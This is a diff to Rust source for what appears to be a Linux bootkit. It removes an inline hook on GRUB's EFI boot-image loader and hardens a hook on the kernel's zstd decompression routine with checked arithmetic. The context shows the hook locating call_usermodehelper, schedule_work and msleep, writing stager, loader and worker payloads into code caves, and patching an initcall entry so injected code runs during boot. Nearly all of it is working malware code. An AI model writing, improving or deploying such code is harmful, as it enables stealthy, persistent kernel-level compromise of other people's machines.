@@ -3,16 +3,10 @@ use log::{debug, error, info};
 use crate::helpers::{
     file_helper::{cave_finder_by_section_name, cave_finder_by_section_name_excluding_after},
     memory_helper::{
-        INLINE_HOOK_SIZE, InitcallPhase, InlineHook, ZSTD_DECOMPRESS_FUNC_SIGNATURE, binary_search,
-        find_sentinel_4, get_initcall_phase_address, inline_jump_hook, restore_inline_hook,
+        INLINE_HOOK_SIZE, InitcallPhase, InlineHook, binary_search,
+        find_sentinel_4, get_initcall_phase_address, restore_inline_hook,
         translate_physical_to_virtual,
     },
-};
-
-pub static mut GRUB_ARCH_EFI_LINUX_BOOT_IMAGE_HOOK_INLINE: InlineHook = InlineHook {
-    target: 0,
-    hook: 0,
-    original_bytes: [0; INLINE_HOOK_SIZE],
 };
 
 pub static mut ZSTD_DECOMPRESS_DCTX_HOOK_INLINE: InlineHook = InlineHook {
@@ -49,111 +43,6 @@ const MIN_TEXT_CAVE_OFFSET: usize = 0x1000;
 // Ubuntu 24.04's 6.8 kernel has CONFIG_DEBUG_OBJECTS_WORK disabled. This is
 // WORK_DATA_INIT(): WORK_STRUCT_NO_POOL with WORK_OFFQ_POOL_SHIFT == 21.
 const WORK_STRUCT_NO_POOL: u64 = 0x000F_FFFF_FFE0_0000;
-
-/// grub_arch_efi_linux_boot_image_hook is an inline hook for the GRUB function responsible for loading Linux boot images on EFI systems.
-/// It restores the original function before executing it to ensure stability, and hooking the Linux kernel.
-///
-/// # Arguments
-/// - `kernel_entry`: The entry point of the Linux kernel.
-/// - `kernel_size`: The size of the Linux kernel.
-/// - `args`: Additional arguments passed to the original function.
-///
-/// # Returns
-/// - `i32`: The return value from the original function, or -1 if an error occurs.
-pub extern "C" fn grub_arch_efi_linux_boot_image_hook(
-    kernel_entry: usize,
-    kernel_size: usize,
-    args: *const u8,
-) -> i32 {
-    let original_fn_addr: usize;
-    let real_kernel_entry: usize;
-    unsafe {
-        core::arch::asm!(
-            "mov {}, rax",
-            out(reg) original_fn_addr,
-            options(nomem, nostack, preserves_flags)
-        );
-        core::arch::asm!(
-            "mov {}, r12",
-            out(reg) real_kernel_entry,
-            options(nomem, nostack, preserves_flags)
-        );
-    }
-
-    debug!(
-        "grub_arch_efi_linux_boot_image_hook called with kernel_entry: {:#x}, kernel_size: {:#x}, args: {:#x}",
-        real_kernel_entry, kernel_size, args as usize
-    );
-
-    // Snapshot hook state once so restore/jump use the same values.
-    let mut target = unsafe {
-        core::ptr::addr_of!(GRUB_ARCH_EFI_LINUX_BOOT_IMAGE_HOOK_INLINE.target).read_volatile()
-    };
-    let original_bytes = unsafe {
-        core::ptr::addr_of!(GRUB_ARCH_EFI_LINUX_BOOT_IMAGE_HOOK_INLINE.original_bytes)
-            .read_volatile()
-    };
-
-    if target == 0 {
-        error!("Hook target was not initialized");
-        return -1;
-    }
-
-    if original_fn_addr == 0 {
-        error!("Original function address was not preserved");
-        return -1;
-    }
-
-    if let Err(e) = restore_inline_hook(target, &original_bytes) {
-        error!("Failed to restore original function: {:?}", e);
-        return -1;
-    }
-
-    let original_fn: extern "C" fn(usize, usize, *const u8) -> i32 =
-        unsafe { core::mem::transmute(original_fn_addr) };
-
-    // Finding zstd_decompress_dctx in vmlinuz.
-    target = match binary_search(
-        real_kernel_entry as usize,
-        kernel_size as usize,
-        ZSTD_DECOMPRESS_FUNC_SIGNATURE,
-    ) {
-        Some(addr) => addr,
-        None => {
-            error!("Failed to find target function in original GRUB");
-
-            return original_fn(kernel_entry, kernel_size, args);
-        }
-    };
-
-    if target == 0 {
-        error!("Failed to find target function in original GRUB");
-
-        return original_fn(kernel_entry, kernel_size, args);
-    }
-    debug!("Found target function at address: {:#x}", target);
-
-    // Hooking vmlinuz's decompression functions.
-    let vmlinuz_hook = zstd_decompress_dctx_hook as *const () as usize;
-    let hook_info = match inline_jump_hook(target, vmlinuz_hook) {
-        Ok(info) => info,
-        Err(e) => {
-            error!("Failed to install inline hook, reason {:?}", e);
-
-            return original_fn(kernel_entry, kernel_size, args);
-        }
-    };
-    unsafe {
-        ZSTD_DECOMPRESS_DCTX_HOOK_INLINE = hook_info;
-    }
-    debug!(
-        "Installed zstd_decompress_dctx_hook at address: {:#x}",
-        vmlinuz_hook
-    );
-
-    // Call the original callee that was held in rax at the patched call site.
-    original_fn(kernel_entry, kernel_size, args)
-}
 
 /// zstd_decompress_dctx_hook is an inline hook for the zstd_decompress_dctx function in the Linux kernel.
 ///
@@ -314,7 +203,14 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
                 return ret_val;
             }
         };
-    call_usermodehelper_phys -= CALL_USERMODEHELPER_DISTANCE as usize;
+    call_usermodehelper_phys =
+        match call_usermodehelper_phys.checked_sub(CALL_USERMODEHELPER_DISTANCE as usize) {
+            Some(addr) => addr,
+            None => {
+                error!("call_usermodehelper pattern distance underflow");
+                return ret_val;
+            }
+        };
     let call_usermodehelper_virt =
         match translate_physical_to_virtual(dst, dst_capacity, call_usermodehelper_phys) {
             Some(addr) => addr,
@@ -335,7 +231,13 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
             return ret_val;
         }
     };
-    schedule_work_phys -= SCHEDULE_WORK_DISTANCE as usize;
+    schedule_work_phys = match schedule_work_phys.checked_sub(SCHEDULE_WORK_DISTANCE as usize) {
+        Some(addr) => addr,
+        None => {
+            error!("schedule_work pattern distance underflow");
+            return ret_val;
+        }
+    };
     let schedule_work_virt =
         match translate_physical_to_virtual(dst, dst_capacity, schedule_work_phys) {
             Some(addr) => addr,
@@ -356,7 +258,13 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
             return ret_val;
         }
     };
-    msleep_phys -= MSLEEP_DISTANCE as usize;
+    msleep_phys = match msleep_phys.checked_sub(MSLEEP_DISTANCE as usize) {
+        Some(addr) => addr,
+        None => {
+            error!("msleep pattern distance underflow");
+            return ret_val;
+        }
+    };
     let msleep_virt = match translate_physical_to_virtual(dst, dst_capacity, msleep_phys) {
         Some(addr) => addr,
         None => {
@@ -481,10 +389,16 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         WORK_STRUCT_NO_POOL, work_entry_virt, worker_cave_virt
     );
 
-    let helper_path_off = LOADER_TEMPLATE
+    let helper_path_off = match LOADER_TEMPLATE
         .windows(HELPER_PATH.len())
         .position(|w| w == HELPER_PATH)
-        .expect("path_buffer start not found in loader template") as u64;
+    {
+        Some(off) => off as u64,
+        None => {
+            error!("Failed to find helper path in loader template");
+            return ret_val;
+        }
+    };
     let module_name_off = helper_path_off + HELPER_PATH.len() as u64;
     debug!(
         "Loader argv will be initialized at runtime: argv[0]=data+{:#x}, argv[1]=data+{:#x}",
@@ -566,13 +480,28 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
 
     let argv_buffer_off = {
         let s = ARGV0_VIRT_SENTINEL.to_le_bytes();
-        LOADER_TEMPLATE
-            .windows(8)
-            .position(|w| w == s.as_slice())
-            .expect("argv_buffer not found in loader template")
+        match LOADER_TEMPLATE.windows(8).position(|w| w == s.as_slice()) {
+            Some(off) => off,
+            None => {
+                error!("Failed to find argv buffer sentinel in loader template");
+                return ret_val;
+            }
+        }
     };
-    let path_buffer_virt = loader_cave_virt + helper_path_off as usize;
-    let argv_buffer_virt = loader_cave_virt + argv_buffer_off;
+    let path_buffer_virt = match loader_cave_virt.checked_add(helper_path_off as usize) {
+        Some(addr) => addr,
+        None => {
+            error!("path buffer virtual address overflow");
+            return ret_val;
+        }
+    };
+    let argv_buffer_virt = match loader_cave_virt.checked_add(argv_buffer_off) {
+        Some(addr) => addr,
+        None => {
+            error!("argv buffer virtual address overflow");
+            return ret_val;
+        }
+    };
 
     let sentinel = PATH_DISP_SENTINEL.to_le_bytes();
     if let Some(off) = find_sentinel_4(&worker_tail, &sentinel) {
@@ -607,6 +536,8 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
     }
 
     unsafe {
+        // Safety: each cave was bounds-checked by the ELF section scanners and
+        // excluded from overlapping reservations before these fixed-size copies.
         core::ptr::copy_nonoverlapping(stager.as_ptr(), stager_cave as *mut u8, STAGER_LEN);
         core::ptr::copy_nonoverlapping(loader.as_ptr(), loader_cave as *mut u8, LOADER_LEN);
         core::ptr::copy_nonoverlapping(worker.as_ptr(), worker_cave as *mut u8, WORKER_LEN);
@@ -637,6 +568,8 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         return ret_val;
     }
     unsafe {
+        // Safety: get_initcall_phase_address returned a validated 4-byte
+        // prel32 entry inside the decompressed kernel image.
         core::ptr::write(
             initcall_info.entry_physical_address as *mut i32,
             relative_offset as i32,
